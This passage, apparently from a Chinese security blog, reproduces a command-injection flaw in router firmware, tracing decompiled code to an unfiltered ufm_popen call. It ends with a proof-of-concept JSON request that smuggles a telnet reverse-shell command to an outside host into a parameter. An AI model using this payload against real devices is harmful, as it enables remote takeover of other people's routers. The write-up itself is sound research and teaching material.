class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">async_cmd_push_queue</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4360A4 &gt;= <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">      uf_log,</span><br><span class="line">      <span class="string">&quot;ERROR (%s %s %d)[async cmd queue fulled!][%d]&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">      <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">      <span class="number">78</span>,</span><br><span class="line">      <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_4360B8);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">68</span>);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">85</span>);</span><br><span class="line">LABEL_5:</span><br><span class="line">    v8 = &amp;unk_4360B8;</span><br><span class="line">LABEL_6:</span><br><span class="line">    pthread_mutex_unlock(v8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);</span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">28</span>) = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed![%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">133</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)invalid commit para!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">139</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v7);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(v7, a1, <span class="number">28</span>);</span><br><span class="line">  v10 = a1[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !v10 || (v12 = strdup(v10), (*(_DWORD *)(v7 + <span class="number">16</span>) = v12) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">97</span>);</span><br><span class="line">    v11 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = json_object_get();</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">12</span>) = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">104</span>);</span><br><span class="line">      v11 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)param obj[%x], para_obg[%x]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        a1[<span class="number">3</span>],</span><br><span class="line">        *(_DWORD *)(v7 + <span class="number">12</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = strdup(v14);</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">24</span>) = v15;</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">112</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">      v16 = *(_DWORD *)(v7 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v16 )</span><br><span class="line">        <span class="built_in">free</span>(v16);</span><br><span class="line">      v17 = *(_DWORD *)(v7 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        json_object_put(v17);</span><br><span class="line">      v18 = *(_DWORD *)(v7 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">        <span class="built_in">free</span>(v18);</span><br><span class="line">      <span class="built_in">free</span>(v7);</span><br><span class="line">      v8 = &amp;unk_4360B8;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">LABEL_34:</span><br><span class="line">  v20 = (_DWORD *)dword_435DE0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br><span class="line">  dword_435DE0 = v7 + <span class="number">60</span>;</span><br><span class="line">  v21 = dword_4360A4;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br><span class="line">  *v20 = v7 + <span class="number">60</span>;</span><br><span class="line">  dword_4360A4 = v21 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">  sem_post(&amp;unk_4360A8);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主要功能是将异步命令推送到队列中</p><h5 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h5><p><strong>获取当前队列头指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20 = (_DWORD *)dword_435DE0;</span><br></pre></td></tr></table></figure><ul><li><code>dword_435DE0</code> 是一个全局变量，指向当前队列的头。将其值存储在 <code>v20</code> 中。</li></ul><p><strong>设置新任务的 <code>next</code> 指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br></pre></td></tr></table></figure><ul><li><code>v7</code> 是新分配的任务结构的基地址。</li><li>假设任务结构的第 60 字节处存储的是指向下一个任务的指针。</li><li>将这个位置初始化为 <code>&amp;commit_task_head</code>，表示新任务的下一个任务是队列头（初始为空）。</li></ul><p><strong>更新队列头指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_435DE0 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure><ul><li>将全局队列头指针 <code>dword_435DE0</code> 更新为新任务的 <code>next</code> 指针位置，即 <code>v7 + 60</code>。</li></ul><p><strong>保存当前队列长度</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v21 = dword_4360A4;</span><br></pre></td></tr></table></figure><ul><li><code>dword_4360A4</code> 是当前队列的长度。将其值存储在 <code>v21</code> 中。</li></ul><p><strong>更新新任务的 <code>prev</code> 指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br></pre></td></tr></table></figure><ul><li>假设任务结构的第 64 字节处存储的是指向前一个任务的指针。</li><li>将这个位置设置为之前的队列头，即 <code>v20</code>。</li></ul><p><strong>更新之前头任务的 <code>next</code> 指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v20 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure><ul><li>将之前队列头任务的 <code>next</code> 指针更新为新任务的 <code>next</code> 指针位置，即 <code>v7 + 60</code>。</li></ul><p><strong>更新队列长度</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_4360A4 = v21 + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>增加队列长度 <code>dword_4360A4</code> 的值。</li></ul><p><strong>设置任务状态</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br></pre></td></tr></table></figure><ul><li>假设任务结构的第 32 字节处存储的是任务状态。</li><li>将这个位置设置为参数 <code>v3</code> 的值。</li></ul><p><strong>初始化信号量（如果需要）</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!v3)</span><br><span class="line">  sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>如果 <code>v3</code> 为 0，则初始化任务结构的第 36 字节处的信号量。</li></ul><p><strong>解锁互斥锁</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_unlock(&amp;unk_4360B8);</span><br></pre></td></tr></table></figure><ul><li>解锁之前加的互斥锁 <code>unk_4360B8</code>。</li></ul><p><strong>释放信号量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sem_post(&amp;unk_4360A8);</span><br></pre></td></tr></table></figure><ul><li>释放信号量 <code>unk_4360A8</code>，表示有新任务加入队列。</li></ul><p><strong>返回新任务的指针</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> v7;</span><br></pre></td></tr></table></figure><ul><li>返回新分配的任务结构的基地址 <code>v7</code>。</li></ul><p>注意到最后使用<code>sem_post</code>的原子操作，将信号量加上了<code>1</code>。因此，应该<strong>会有其他地方在检测到信号量发生改变后，对数据进行处理</strong>。</p><p>意味着其他地方应该是有sem_wait阻塞了一个线程的执行</p><blockquote><ul><li><code>sem_wait</code> 用于等待信号量。如果信号量的值为零，它会阻塞直到信号量的值大于零。</li><li><code>sem_post</code> 用于释放信号量，将信号量的值加一，并唤醒等待的线程（如果有）。</li><li>主要是实现线程间的同步和互斥，确保程序安全运行</li></ul></blockquote><p>对其进行交叉引用发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_41AFC8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  pthread_setcanceltype(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = pthread_self();</span><br><span class="line">  pthread_detach(v2);</span><br><span class="line">  prctl(<span class="number">15</span>, <span class="string">&quot;exec_cmd_task&quot;</span>);</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(&amp;unk_4360A8);</span><br><span class="line">      pthread_mutex_lock(<span class="number">4415672</span>);</span><br><span class="line">      v3 = commit_task_head;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span> *)commit_task_head == &amp;commit_task_head )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = commit_task_head - <span class="number">60</span>;</span><br><span class="line">        *(_DWORD *)(*(_DWORD *)commit_task_head + <span class="number">4</span>) = *(_DWORD *)(commit_task_head + <span class="number">4</span>);</span><br><span class="line">        **(_DWORD **)(v3 + <span class="number">4</span>) = *(_DWORD *)v3;</span><br><span class="line">        *(_DWORD *)(v3 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">        --dword_4360A4;</span><br><span class="line">      &#125;</span><br><span class="line">      pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v4 );</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span>) = dword_4360A0;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    sub_41ADF0(v4);</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(_DWORD *)(v4 + <span class="number">52</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        <span class="built_in">free</span>(v5);</span><br><span class="line">      sub_41AD10(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_post(v4 + <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从sub_41AFC8函数中找到他的sem_wait函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_41ADF0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">128</span>]; <span class="comment">// [sp+20h] [-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+A0h] [-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (a1[<span class="number">5</span>] &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(v1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3[<span class="number">14</span>] = result;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v1 + <span class="number">76</span>;</span><br><span class="line">    pthread_mutex_lock(v1 + <span class="number">76</span>);</span><br><span class="line">    <span class="keyword">if</span> ( _sigsetjmp(v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_mutex_unlock(v5);</span><br><span class="line">      _pthread_unwind_next(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    _pthread_register_cancel(v4);</span><br><span class="line">    <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">14</span>] = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(*a1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)backgroup exec end[%s]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;exec_commit&quot;</span>,</span><br><span class="line">          <span class="number">220</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)(*a1 + <span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span> _pthread_unregister_cancel(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)a1 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      result = ufm_popen((<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>], a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_fork_as(a1[<span class="number">7</span>]);</span><br><span class="line">    result = <span class="number">231</span>;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)uf_fork_as [%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;exec_commit&quot;</span>, <span class="number">231</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这里有个ufm_popen函数，而a1[7]显然是偏移28的位置</p><p>可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v19 = strdup(a2);</span><br><span class="line">*(_DWORD *)(v7 + <span class="number">28</span>) = v19;               <span class="comment">// 将shell存在28的位置</span></span><br></pre></td></tr></table></figure><p>在async_cmd_push_queue函数中早已将shell存到了当前的位置，因此执行该shell，且没有任何的过滤，到此二进制文件的分析就结束了，但是我还是有些许的疑问</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;sorry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.121.101 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="疑问-解决"><a href="#疑问-解决" class="headerlink" title="疑问&amp;解决"></a>疑问&amp;解决</h2><h4 id="为什么主机和qemu无法通信？"><a href="#为什么主机和qemu无法通信？" class="headerlink" title="为什么主机和qemu无法通信？"></a>为什么主机和qemu无法通信？</h4><p>首先问题算是一种特殊情况，因为tap0分配了两个ipv4地址，导致冲突</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr show tap0</span><br></pre></td></tr></table></figure><p>查看完后任意删除一个地址即可通信了，可能是重复配置的原因吧</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个漏洞是我复现的第二个漏洞，收获很多，第一次感受到路由器的组成，不过还是有着许多的坎坷，感受到了winmt师傅的强大，只能说连复现都那么坎坷，那如何寻找漏洞呢，这次复现给了我一个思路便是从可控字段出发，然后再从shell执行返回，找到交汇点，看起来在iot上我还有很多的路要走</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zikh26.github.io/posts/e5651b4f.html">https://zikh26.github.io/posts/e5651b4f.html</a></p><p><a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p><p><a href="https://zhuanlan.zhihu.com/p/437933584">https://zhuanlan.zhihu.com/p/437933584</a></p>]]></content>
    
    
      
      
